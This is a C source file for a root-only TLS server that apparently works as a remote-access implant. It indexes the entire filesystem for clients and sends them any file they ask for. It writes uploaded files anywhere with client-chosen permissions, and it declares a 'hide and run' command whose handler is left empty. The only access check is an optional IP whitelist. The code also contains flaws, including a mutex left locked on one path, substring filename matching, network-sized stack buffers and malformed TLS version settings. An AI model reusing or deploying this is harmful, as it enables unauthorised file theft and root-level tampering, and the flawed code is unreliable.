// std includes
#include <stdlib.h>
#include <stdio.h> 
#include <stdbool.h>
#include <string.h>
#include <getopt.h>
#include <ctype.h>

// sys includes
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <pthread.h>
#define _POSIX_C_SOURCE  199309L
#define __USE_GNU
#include <poll.h>
#include <signal.h>

// network includes
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <resolv.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/select.h>

#include <libgen.h>

#include "utils.h"

#define noparam(x)         ((x) == QUERY_GET_FSM || (x) == QUERY_GET_FSM_DIR)

#define N_MAX_CLIENTS       2
#define FSUPDATE_TIMER      5*60        // every 5 minutes

typedef struct _mem_string{
    size_t len;
    char *s;
} mem_string;

/***** GLOBAL VARS *****/
int onExit = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
mem_string *files = NULL;
int nb_files;

typedef unsigned int uint;

/***** UTILS *****/

/**
 * Analyze if the socket pointed by the socket descriptor is closed by remote 
 * @warning the passed socket need to be closed outside this func
 */
int
closed_socket(int sock)
{
    struct pollfd pfd = {
        .fd = sock,
        .events = POLLRDHUP|POLLIN,
        .revents = 0
    };

    while (pfd.revents == 0)
    {
        if (poll(&pfd, 1, 100) > 0)
        {
            if ((pfd.revents & POLLRDHUP) == POLLRDHUP)
            {
                return 1;
            }

            // if linux version < 2.6.17, POLLRDHUP will not be defined and so need to detect closed sock by this way
            char buf[10] = { 0 };
            if (recv(sock, buf, sizeof buf, MSG_PEEK | MSG_DONTWAIT) == 0)
            {
                return 1;
            }
        }
    }
    return 0;
}


/***** ARGS FETCHING *****/
int 
get_port(const char *str)
{
    for (unsigned int i=0; i<strlen(str); i++)
    {
        if (!isdigit(str[i]))
            return -1;
    }
    int port = atoi(str);
    if (port <= 0 || port > 65535)
        return -1;
    return port;
}

#include <assert.h>

char** str_split(char* a_str, const char a_delim, uint *len)
{
    char** result    = 0;
    size_t count     = 0;
    char *work_str = strdup(a_str);
    char* tmp        = work_str;
    char* last_comma = 0;
    char delim[2];
    delim[0] = a_delim;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp)
    {
        if (a_delim == *tmp)
        {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (work_str + strlen(work_str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = malloc(sizeof *result * count);
    assert(result);
    size_t idx  = 0;
    char *token = strtok(work_str, delim);

    while (token)
    {
        assert(idx < count);
        *(result + idx++) = strdup(token);
        token = strtok(NULL, delim);
    }
    assert(idx == count - 1);
    *(result + idx) = NULL;

    *len = count;
    return result;
}

/**
 * Split wordlist respecting following format: --whitelist=127.0.0.1,192.168.1.1,10.10.9.123
 *                                                         |         passed arg             | 
 */
char **
get_whitelist(char *arg, unsigned int *wl_size)
{
    if (!arg || !wl_size)
        return NULL;
    char *str = malloc(sizeof *str * (strlen(arg)+1));
    if (!str)
        return NULL;
    memset(str, 0, strlen(arg)+1);
    memcpy(str, arg, strlen(arg));
    unsigned int whitelist_len = 0;
    char **wl = str_split(str, ',', &whitelist_len);
    
    *wl_size = --whitelist_len;
    return wl;
}

static void
usage(const char *cmd)
{
    fprintf(stderr, "Usage: %s <port> [-d <directory>] [-w <whitelist> (x.x.x.x,y.y.y.y,...)]\n", cmd);
    exit(1);
}

/***** FILE MAPPING *****/
void
retrieve_files(const char *dir)
{
    int tube[2];
    if (pipe(tube) < 0)
    {
        perror("pipe");
        exit(1);
    }
    pid_t id = fork();
    if (!id)
    {
        close(tube[0]);
        dup2(tube[1], STDOUT_FILENO);
        close(STDERR_FILENO);
        execlp("/bin/find", "/bin/find", dir, "-type", "f", NULL);
        perror("execlp");
        exit(1);
    }
    close(tube[1]);
    int max_strings = 50;
    int nb_strings = 0;
    if (files)
    {
        for (int i=0; i<nb_files; i++)
        {
            if (files[i].s)
                free(files[i].s);
        }
        free(files);
    }
    files = malloc(sizeof(mem_string) * max_strings);
    if (!files)
    {
        perror("malloc");
        exit(1);
    }
    char buf [PATH_MAX+1];
    while (read_until_char(tube[0], buf, sizeof buf, '\n') > 0)
    {
        if (nb_strings == max_strings)
        {
            mem_string *tmp = NULL;
            tmp = realloc(files, sizeof(mem_string)*(max_strings *= 2));
            if (!tmp)
            {
                free(files);
                perror("realloc");
                exit(1);
            }
            files = tmp;
        }
        files[nb_strings].len = strlen(buf);
        files[nb_strings].s = malloc(strlen(buf)+1);
        if (!files[nb_strings].s)
        {
            perror("malloc");
            exit(1);
        }
        strcpy(files[nb_strings].s, buf);
        files[nb_strings].s[strlen(buf)] = '\0';
        nb_strings++;
    }
    close(tube[0]);
    wait(NULL);
    nb_files = nb_strings;
    return;
}

char *
get_full_pathname(const char *file)
{
    char *cur = NULL;
    for (int i=0; i<nb_files; i++)
    {
        if ((cur = strstr(files[i].s, file)) != NULL)
        {
            // carefull there, test that and change if needed
            if (strstr(files[i].s, file) != NULL)    // check if the cur string is really corresponding to the submitted file (check if its in last path position)
            {
                return files[i].s;
            }
        }
    }
    return NULL;
} 

ssize_t
get_file_len(const char *filename)
{
    if (access(filename, F_OK|R_OK) < 0)
        return -1;
    
    int fd = open(filename, O_RDONLY);
    if (fd < 0)
    {
        perror("open");
        exit(1);
    }

    size_t len = lseek(fd, 0, SEEK_END);
    close(fd);
    return len;
}

size_t
get_mem_string_arr_payload_len(mem_string *arr, int nb_e)
{
    if (!arr || nb_e <= 0)
        return 0;
    size_t len = 0;
    for (int i = 0; i<nb_e; i++)
    {
        if (!arr[i].s)
            return 0;
        len += arr[i].len+1;
    }
    return len;
}

void
free_mem_string_arr(mem_string *arr, int nb_e)
{
    if (arr)
    {
        for (int i=0; i<nb_e; i++)
        {
            if (arr[i].s)
                free(arr[i].s);
        }
        free(arr);
    }
}

/***** SSL SERVER *****/
int
init_and_bind_sock(uint16_t port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        exit(1);
    }

    char hostname[256];
    if (gethostname(hostname, sizeof hostname) < 0)
    {
        perror("gethostname");
        exit(1);
    }

    struct hostent *host_entry;
    if ((host_entry = gethostbyname(hostname)) == NULL)
    {
        perror("gethostbyname");
        exit(1);
    }
/*
#ifdef SO_REUSEPORT
    char c = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &c, 1) < 0)
    {
        perror("setsockopt");
        exit(1);
    }
#endif
*/ 
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        //.sin_addr.s_addr = (*(struct in_addr*) host_entry->h_addr_list[0]).s_addr
        .sin_addr.s_addr = INADDR_ANY       // not cool, need to not bind 127.0.0.1
    };
    if (bind(sock, (struct sockaddr*) &sa, sizeof sa) < 0)
    {
        perror("bind");
        exit(1);
    }
    return sock; 
}

SSL_CTX *
init_SSL_CTX()
{
    SSL_CTX *ctx;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    const SSL_METHOD *method = TLS_server_method();
    ctx = SSL_CTX_new(method);
    if ( ctx == NULL )
    {
        ERR_print_errors_fp(stderr);
        exit(1);
    }
    SSL_CTX_set_min_proto_version(ctx, 3);
    SSL_CTX_set_max_proto_version(ctx, 3);
    return ctx;
}

void
load_certs(SSL_CTX *ctx, const char *certfile, const char *keyfile)
{
    if ( SSL_CTX_use_certificate_file(ctx, certfile, SSL_FILETYPE_PEM) != 1 )
    {
        ERR_print_errors_fp(stderr);
        exit(1);
    }
    if ( SSL_CTX_use_PrivateKey_file(ctx, keyfile, SSL_FILETYPE_PEM) != 1 )
    {
        ERR_print_errors_fp(stderr);
        exit(1);
    }
    if ( SSL_CTX_check_private_key(ctx) != 1)
    {
        fprintf(stderr, "Private key does not match the public certificate\n");
        exit(1);
    }
}

enum query_err {
    INVALID_UPLOAD_PARAMS = -5,
    INVALID_HARE_PARAMS,
    FILE_DONT_EXIST,
    MAPPING_NOT_DONE,
    UNKNOWN_QUERY,
};

/*
 * @brief   Analyze the submitted buffer and check if content is a valid query
 */
unsigned char *
get_and_analyze_query(SSL *ssl, int *ret_type)
{
    unsigned char *retbuf = NULL;
    char buf[QUERY_BUF_LEN] = { 0 };

    //assert(size <= QUERY_BUF_LEN);
    pthread_mutex_lock(&lock);
    if (get_mem_string_arr_payload_len(files, nb_files) <= 0)
    {
        *ret_type = MAPPING_NOT_DONE;
        return NULL;
    }
    pthread_mutex_unlock(&lock);

    memset(buf, 0, sizeof buf);
    int n = 0;
    if ((n = SSL_read(ssl, buf, QUERY_BUF_LEN)) < 0)
    {
        ERR_print_errors_fp(stderr);
        exit(1);
    }
    retbuf = mem_alloc(QUERY_BUF_LEN);
    uint size = QUERY_BUF_LEN;
    uint len = n;
    memcpy(retbuf, buf, QUERY_BUF_LEN);
    unsigned char *tmp = NULL;
    int32_t query_t = *(int32_t*) buf;
    if (!noparam(query_t))
    {
        // read all data and fill a HEAP buffer
        if (n == QUERY_BUF_LEN)
        {
            do
            {
                if ((n = SSL_read(ssl, buf, QUERY_BUF_LEN)) < 0)
                {
                    ERR_print_errors_fp(stderr);
                    free(retbuf);
                    exit(1);
                }
                if (len + n > size)
                {
                    tmp = realloc(retbuf, size*2);
                    if (!tmp)
                    {
                        free(retbuf);
                        perror("realloc");
                        exit(1);
                    }
                    size *= 2;
                    retbuf = tmp;
                    tmp = NULL;
                }
                memcpy(retbuf+len, buf, n);
                len += n;
            } while (n == QUERY_BUF_LEN);
            tmp = realloc(retbuf, len+1);
            if (!tmp)
            {
                free(retbuf);
                perror("realloc");
                exit(1);
            }
            retbuf = tmp;
            tmp = NULL;
        }

    }

    switch (query_t)
    {
        case QUERY_GET_FSM:
        {
            *ret_type = QUERY_GET_FSM;
            return retbuf;
        }
        case QUERY_GET_FILE:
        {
            uint64_t fn_len = *(uint64_t*) (retbuf + sizeof(int32_t));
            char filename[fn_len+1];
            memset(filename, 0, sizeof filename);
            strncpy(filename, (const char*)(retbuf + sizeof(int32_t) + sizeof(int64_t)), fn_len);

            ssize_t file_len = get_file_len(get_full_pathname(filename));
            if (file_len < 0)
            {
                *ret_type = FILE_DONT_EXIST;
                free(retbuf);
                return NULL;
            }
            *ret_type = QUERY_GET_FILE;
            return retbuf;
        }
        case QUERY_GET_FSM_DIR:
        {
            *ret_type = QUERY_GET_FSM_DIR;
            return retbuf;
        }
        case QUERY_UPLOAD_FILE:
        {
            size_t bufsiz = *(size_t*) (retbuf + sizeof(int32_t));
            tmp = retbuf + sizeof(int32_t) + sizeof(uint64_t);
            upload_params *up = get_upload_params_from_serialized(tmp, bufsiz);
            if (!up)
            {
                *ret_type = INVALID_UPLOAD_PARAMS;
                free(retbuf);
                return NULL;
            }
            free_upload_params(up);
            *ret_type = QUERY_UPLOAD_FILE;
            return retbuf;
        }
        case QUERY_HIDE_AND_RUN:
        {
            size_t bufsiz = *(size_t*) (retbuf + sizeof(int32_t));
            tmp = retbuf + sizeof(int32_t) + sizeof(uint64_t);
            hare_params *hp = get_hare_params_from_serialized(tmp, bufsiz);
            if (!hp)
            {
                *ret_type = INVALID_HARE_PARAMS;
                free(retbuf);
                return NULL;
            }
            if (hp->cmd_line_args == NULL)
            {
                *ret_type = INVALID_HARE_PARAMS;
                free(retbuf);
                return NULL;
            }
            if (hp->cmd_line_args[0] == NULL)
            {
                *ret_type = INVALID_HARE_PARAMS;
                free(retbuf);
                return NULL;
            }
            char fullname[PATH_MAX+NAME_MAX+2] = { 0 };
            snprintf(fullname, sizeof fullname, "%s/%s", hp->u_params->dir, hp->u_params->filename);
            if (strcmp(hp->cmd_line_args[0], hp->u_params->filename) != 0 && strcmp(hp->cmd_line_args[0], fullname) != 0)
            {
                *ret_type = INVALID_HARE_PARAMS;
                free(retbuf);
                return NULL;
            }
            free(hp);
            *ret_type = QUERY_HIDE_AND_RUN;
            return retbuf;
        }
        default:
            break;
    }

    *ret_type = UNKNOWN_QUERY;
    free(retbuf);
    return NULL;
}

int
SSL_send_file(SSL *ssl, const char *pathname)
{
    int fd = open(pathname, O_RDONLY);
    if (fd < 0)
    {
        perror("open");
        exit(1);
    }
    size_t len = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    char buf[len+sizeof(uint64_t)+1];
    char *tmp = buf;
    
    if (!check_unaligned(tmp, int64_t))
        fprintf(stderr, "Unaligned int64_t at addr %p !\n", tmp);
    *(uint64_t*) tmp = (uint64_t) len;
    tmp += sizeof(uint64_t);
    if (read(fd, tmp, len) < 0)
    {
        perror("read");
        exit(1);
    }
    close(fd);

    return SSL_write(ssl, buf, len + sizeof(uint64_t));
}

int
SSL_send_systemfile_mapping(SSL *ssl, mem_string *file_paths, int nfiles)
{
    int len = get_mem_string_arr_payload_len(file_paths, nfiles);
    len += sizeof(uint64_t) + sizeof(int32_t);
    char buf [len];
    char *tmp = buf;
    if (!check_unaligned(tmp, int64_t))
        fprintf(stderr, "Unaligned int64_t at addr %p !\n", tmp);
    *(int64_t*) tmp = len-sizeof(uint64_t)-sizeof(uint32_t);
    tmp += sizeof(int64_t);
    if (!check_unaligned(tmp, int32_t))
        fprintf(stderr, "Unaligned int64_t at addr %p !\n", tmp);
    *(int32_t*) tmp = nfiles;
    tmp += sizeof(int32_t);
    for (int i = 0; i < nfiles; i++)
    {
        strcpy(tmp, file_paths[i].s);
        *(tmp+file_paths[i].len) = '\0';
        tmp += file_paths[i].len+1;
    }
    
    return SSL_write(ssl, buf, len);
}

void *
fsupdate_thread_routine(void *args)
{
    char *dir = (char*) args;

    time_t last = time(NULL);
    while (!onExit)
    {
        if (time(NULL) - last >= FSUPDATE_TIMER)
        {
            pthread_mutex_lock(&lock);
            retrieve_files(dir); 
            printf("re-mapping files\nnb files = %d\n", nb_files);
            last = time(NULL);
            pthread_mutex_unlock(&lock);
        }
    }
    return NULL;
}

void *
sighandler_routine(void *args)
{
    sigset_t set;
    siginfo_t info;
    while (!onExit)
    {
        sigemptyset(&set);
        sigaddset(&set, SIGINT);
        if (sigwaitinfo(&set, &info) < 0)
        {
            if (errno != EINTR)
            {
                perror("sigwaitinfo");
                onExit = 1;
            }
        }
        if (info.si_signo == SIGINT)
        {
            printf("SIGINT catch !\n");
            onExit = 1;
        }
    }

    return NULL;
}

/***** MAIN *****/
int
main(int argc, char **argv)
{
    if (getuid() != 0)
    {
        fprintf(stderr, "YOU MUST RUN THIS AS ROOT !\n");
        exit(1);
    }

    struct option options[] = {
        {"directory", required_argument, 0, 'd'},
        {"whitelist", required_argument, 0, 'w'},
        {0, 0, 0, 0}
    };
    int opt, port;
    fd_set rdfs;
    pthread_t th_fsu, th_sighandler;
    char directory[PATH_MAX] = { 0 }; 
    char **whitelist = NULL;
    unsigned int wl_len = 0;

    while ((opt = getopt_long(argc, argv, "d:w:", options, NULL)) != -1)
    {
        if (opt == 'd')
        {
            strcpy(directory, optarg);
        }
        else if (opt == 'w')
        {
            whitelist = get_whitelist(optarg, &wl_len);
            if (!whitelist)
                exit(1);
        }
        else
        {
            usage(argv[0]);
        }
    }
    if (argc-optind == 1) 
    {
        port = get_port(argv[argc-1]);
        if (port < 0)
            usage(argv[0]);
    }
    else 
        usage(argv[0]);

    if (strlen(directory) == 0)
    {
        snprintf(directory, sizeof directory, "/");
    }
    retrieve_files(directory);

    for (int i=0; i<nb_files; i++)
    {
        printf("%s\n", files[i].s);
    }
    printf("nb files = %d\n", nb_files);

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    if (pthread_sigmask(SIG_BLOCK, &set, NULL) != 0)
    {
        perror("pthread_sigmask");
        exit(1);
    }
    if (pthread_create(&th_sighandler, NULL, sighandler_routine, NULL) != 0)
    {
        perror("pthread_create");
        exit(1);
    }

    if (pthread_create(&th_fsu, NULL, fsupdate_thread_routine, (void*) directory) != 0)
    {
        perror("pthread_create");
        exit(1);
    }

    int sock = init_and_bind_sock(port);
    SSL_CTX *ctx = init_SSL_CTX();
    load_certs(ctx, "mycert.pem", "key.pem");
    listen(sock, N_MAX_CLIENTS);
    int sockets[N_MAX_CLIENTS];
    SSL *ssls[N_MAX_CLIENTS];               // ssl sessions
    //pthread_t ths_client[N_MAX_CLIENTS];
    int nb_clients = 0;
    int max = sock;
    while (!onExit)
    {
        FD_ZERO(&rdfs);

        FD_SET(sock, &rdfs);
        for (int i = 0; i < nb_clients; i++)
        {
            FD_SET(sockets[i], &rdfs);
        }
        
        struct timeval tv = {
            .tv_sec = 1,
            .tv_usec = 0
        };
        if (select(max+1, &rdfs, NULL, NULL, &tv) < 0)
        {
            perror("select");
            exit(1);
        }
        if (tv.tv_sec == 0 && tv.tv_usec == 0)
            continue;

        if (FD_ISSET(sock, &rdfs))
        {
            struct sockaddr_in caddr = { 0 };
            socklen_t caddrlen = sizeof caddr;
            int csock = accept(sock, (struct sockaddr*) &caddr, &caddrlen);
            if (csock < 0)
                continue;

            printf("New Connection incomming\n");

            if (nb_clients >= N_MAX_CLIENTS)
            {
                close(csock);
                continue;
            }

            if (whitelist != NULL)
            {
                struct sockaddr_in remote;
                getpeername(csock, (struct sockaddr*)&remote, &caddrlen);
                char *ip = inet_ntoa(remote.sin_addr);
                bool whitelisted = false;
                for (size_t i = 0; i < wl_len; i++)
                {
                    if (strcmp(whitelist[i], ip) == 0)
                        whitelisted = true;
                }
                if (!whitelisted)
                {
                    fprintf(stderr, "Refusing connection from %s !\n", ip);
                    close(csock);
                    continue;
                }
                fprintf(stderr, "Connection incoming from %s !\n", ip);
            }

            SSL *ssl = SSL_new(ctx);
            SSL_set_min_proto_version(ssl, 3);
            SSL_set_max_proto_version(ssl, 3);
            SSL_set_fd(ssl, csock);
            if (SSL_accept(ssl) < 0)
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl);
                close(csock);
                continue;
            }

            ssls[nb_clients] = ssl;
            sockets[nb_clients] = csock;
            nb_clients++;
            //pthread_create(ths_client+nb_clients, NULL, client_thread_routine, ssl);
        }

        //char buf[QUERY_BUF_LEN];
        unsigned char *tmp;
        int new_max = -1;
        int nb_closed = 0;
        for (int i = 0; i < nb_clients; i++)
        {
            if (closed_socket(sockets[i]) == 1)
            {
                // clear client info
                printf("Clearing a client !\n");
                FD_CLR(sockets[i], &rdfs);
                SSL_free(ssls[i]);
                close(sockets[i]);
                shift_array_left(ssls, sizeof(SSL*), N_MAX_CLIENTS, i);
                shift_array_left(sockets, sizeof(int), N_MAX_CLIENTS, i);
                nb_closed++;
                continue;
            }
            else if (new_max < sockets[i])
                new_max = sockets[i];

            if (FD_ISSET(sockets[i], &rdfs))
            {
                /*
                memset(buf, 0, sizeof buf);
                tmp = buf;
                // wait for query & check if client is disconnected
                if (SSL_read(ssls[i], buf, QUERY_BUF_LEN) < 0)
                {
                    ERR_print_errors_fp(stderr);
                    exit(1);
                }
                */

                int type = 0;
                unsigned char *query = get_and_analyze_query(ssls[i], &type);
                tmp = query;
                size_t err = 0;
                switch (type)
                {
                    case QUERY_GET_FSM:
                    case QUERY_GET_FILE:
                    case QUERY_GET_FSM_DIR:
                    case QUERY_UPLOAD_FILE:
                    case QUERY_HIDE_AND_RUN:
                        printf("Query has been successfully analyzed (type=%s) !\n", query_type[type]);
                        break;
                    case UNKNOWN_QUERY:
                        err = 0;
                        printf("Unrecognized query... ;_;\n");
                        SSL_write(ssls[i], &err, sizeof(size_t));
                        break;
                    case MAPPING_NOT_DONE:
                        printf("File mapping not done yet !\n");
                        err = type * -1;
                        SSL_write(ssls[i], &err, sizeof(size_t));
                        break;
                    case FILE_DONT_EXIST:
                        printf("Requested file doesn't exists !\n");
                        err = type * -1;
                        SSL_write(ssls[i], &err, sizeof(size_t));
                        break;
                    default:
                        printf("Error (%d)\n", type * -1);
                        err = type * -1;
                        SSL_write(ssls[i], &err, sizeof(size_t));
                        break;
                }

                pthread_mutex_lock(&lock);
                switch(type)
                {
                    case QUERY_GET_FSM:
                    {
                        int n;
                        if ((n = SSL_send_systemfile_mapping(ssls[i], files, nb_files)) < 0)
                            ERR_print_errors_fp(stderr);
                        if ((long unsigned int)n != (get_mem_string_arr_payload_len(files, nb_files) + sizeof(uint64_t) + sizeof(int32_t)))
                            fprintf(stdout, "   [X]  -- Didn't send all the payload (only %d bytes sent)\n", n);
                        else
                            fprintf(stdout, "   [OK] -- Answer successfully sent !\n");
                        break;
                    }
                    case QUERY_GET_FILE:
                    {
                        tmp += sizeof(int32_t) + 2*sizeof(size_t);
                        char *pathname = get_full_pathname((const char*)tmp);
                        if (!pathname)
                        {
                            fprintf(stderr, "   [X]  -- Error cannot find file in sysfile mapping :/\n");
                            break;
                        }
                        if (SSL_send_file(ssls[i], pathname) < 0)
                            ERR_print_errors_fp(stderr);
                        printf("   [OK] -- Sending file %s\n", pathname);
                        break;
                    }
                    case QUERY_GET_FSM_DIR:
                    {
                        char payload[sizeof(uint64_t)+strlen(directory)+1];
                        char *ptr= payload;
                        *(uint64_t*) ptr = strlen(directory)+1;
                        ptr += sizeof(uint64_t);
                        strcpy(ptr, directory);
                        *(ptr+strlen(directory)) = 0;
                        if (SSL_write(ssls[i], payload, sizeof payload) < 0)
                            ERR_print_errors_fp(stderr);
                        printf("   [OK] -- Sending dir %s\n", directory);

                        break;
                    }
                    case QUERY_UPLOAD_FILE:
                    {
                        size_t size = *(size_t*) query+sizeof(int32_t);
                        tmp = query + sizeof(int32_t) + sizeof(size_t);
                        upload_params *up = get_upload_params_from_serialized(tmp, size);
                        char fullname[PATH_MAX+NAME_MAX+2] = { 0 };
                        snprintf(fullname, sizeof fullname, "%s/%s", up->dir, up->filename);
                        int fd = open(fullname, O_WRONLY|O_CREAT|O_TRUNC, up->flags);
                        if (fd < 0)
                        {
                            free_upload_params(up);     // im a cool guy so i free
                            free(query);                // some shit
                            exit(1);
                        }
                        write(fd, up->content, up->len);
                        close(fd);
                        free_upload_params(up);
                        err = QUERY_SUCCESS;
                        SSL_write(ssls[i], &err, sizeof(size_t));
                        break;
                    }
                    case QUERY_HIDE_AND_RUN:
                    {

                        break;
                    }
                }
                free(query);
                pthread_mutex_unlock(&lock);
            }
        }
        if (new_max > max)
            max = new_max;
        nb_clients -= nb_closed;
    }

    pthread_join(th_sighandler, NULL);
    pthread_join(th_fsu, NULL);
    for (int i=0; i<nb_clients; i++)
    {
        SSL_free(ssls[i]);
        close(sockets[i]);
    }
    SSL_CTX_free(ctx);
    close(sock);
    for (uint i=0; i<wl_len; i++)
    {
        if (whitelist[i])
            free(whitelist[i]);
    }
    if (whitelist)
        free(whitelist);
    if (files)
        free_mem_string_arr(files, nb_files);
    printf("Terminated !\n");
    return 0;
}